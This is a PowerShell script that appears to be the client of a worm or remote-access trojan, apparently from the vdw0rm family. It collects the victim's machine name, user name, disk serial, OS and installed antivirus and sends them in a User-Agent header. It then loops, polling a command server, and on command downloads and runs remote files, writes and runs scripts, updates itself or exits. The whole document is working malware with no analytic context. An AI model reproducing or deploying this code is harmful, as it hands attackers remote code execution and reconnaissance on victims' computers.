#powershell -ExecutionPolicy Bypass -Command ""
$spl = '\';
$vn = 'Guest';
function info {
    try {
        $mch = [environment]::Machinename;
        $usr = [environment]::username;
        $HWD = (Get-WmiObject Win32_LogicalDisk).VolumeSerialNumber;
        $HWD = $HWD[0];
        $wi = (Get-WmiObject Win32_OperatingSystem).Caption;
        $wi = $wi + (Get-WmiObject Win32_OperatingSystem).OSArchitecture;
        $wi =$wi.replace('64-bit',' x64').replace('32-bit',' x86');
        $av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
        $e = $env:windir + '\Microsoft.NET\Framework\v2.0.50727\vbc.exe';
        if (test-path $e) {
            $nt = 'YES'
        } else {
            $nt= 'NO'
        };
        if (test-path 'HKCU:\vdw0rm') {
            $usb = 'TRUE'
        } else {
            $usb = 'FALSE'
        };
        $u = $vn + '_' + $HWD + $spl + $mch + $spl + $usr + $spl + $wi + $spl + $av + $spl + $spl + $nt + $spl + $usb + $spl;
        return $u
    } catch {
        Start-Sleep -s 3
    }
}
function post ($cmdv, $v) {
    try { 
        $enc = [system.Text.Encoding]::UTF8;
        $Req = [System.Net.HttpWebRequest]::Create('http://127.0.0.1:9942/' + $cmdv);
        $Req.Method = 'POST';
        $req.UserAgent = info;
        [System.IO.Stream]$stm;
        $stm = $Req.GetRequestStream();
        $Y = $enc.GetBytes([byte][char]$V);
        $Stm.Write($Y, 0, $Y.Length);
        $stm.close();
        $resp = $req.GetResponse().GetResponseStream();
        $sr = New-Object System.IO.StreamReader($resp);
        $v=$sr.ReadToEnd();
        $sr.close();
        return [string]$v
    } catch {
        Start-Sleep -s 3
    }
};
$infinite =$true;
while($infinite) {
    $cmd = @(post('Vre','').ToString());
    $T,$T1,$T2 = $cmd[1] -csplit 'ameer',3;
    if ($T -eq 'exc') {
        try {
            (New-Object System.Net.WebClient).DownloadFile($T1, $env:temp + '\' + $T2);
            [Diagnostics.Process]::Start($env:temp + '\' + $T2)
        } catch {
            Start-Sleep -s 3
        }
    };
    if ($T -eq 'Sc') {
        Try {
            [IO.File]::AppendAllText($env:temp + '\' + $T2,$T1);
            [Diagnostics.Process]::Start($env:temp + '\' + $T2)
        } Catch {
            Start-Sleep -s 3
        }
    };
    if ($T -eq 'Rn') {
        try {
            $Gb = [system.Text.Encoding]::Default;
            [IO.File]::WriteAllBytes($env:temp + '\' + $T2,$Gb.GetBytes($T1));
            [Diagnostics.Process]::Start($env:temp + '\' + $T2)
        } catch {
            Start-Sleep -s 3 }
        };
    if ($T -eq 'Up') {
        try {
            $Gb = [system.Text.Encoding]::Default;
            [IO.File]::WriteAllBytes($env:temp + '\' + $T2,$Gb.GetBytes($T1));
            [Diagnostics.Process]::Start($env:temp + '\' + $T2);
            exit
        } catch {
            Start-Sleep -s 3
        }
    };
    if ($T -eq 'Cl') {
        exit
    };
    $T = $null;
    $T1= $null;
    $T2 = $null;
    Start-Sleep -s 7
}